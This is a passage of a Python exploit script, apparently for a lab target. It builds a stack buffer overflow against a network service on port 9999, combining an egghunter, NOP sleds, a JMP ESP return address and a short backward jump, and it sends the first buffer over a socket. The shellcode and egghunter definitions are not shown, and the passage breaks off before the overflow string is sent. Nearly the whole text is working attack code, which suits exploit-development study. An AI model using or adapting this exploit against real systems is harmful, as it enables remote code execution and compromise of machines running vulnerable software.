...
# command one is the buffer where we place our shellcode
# command two contains the egghunter, EIP hijacking and  jump back 70 bytes to reach our egghunter
JMP_ESP = "\xc7\x11\x50\x62"
SHORT_JUMP_BACK_SEVENTY = "\xEB\xB8\x90\x90"

# Basically if we control EIP and send in a JMP_ESP instruction, adding additional machine instructions lands at the top of the stack and is executed immediately
evilString = "\x90" * 18 + egghunter + "\x90"*20 + JMP_ESP + SHORT_JUMP_BACK_SEVENTY + "C" * 150

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# inject the payload within the section of buffer we control
s.connect(('192.168.122.125',9999))
s.recv(1024)
s.send(command1)
s.close()

# inject egghunter, nop sleds, and jump back seventy bytes as a trampoline to have the egghunter search for the payload with EGGEGG
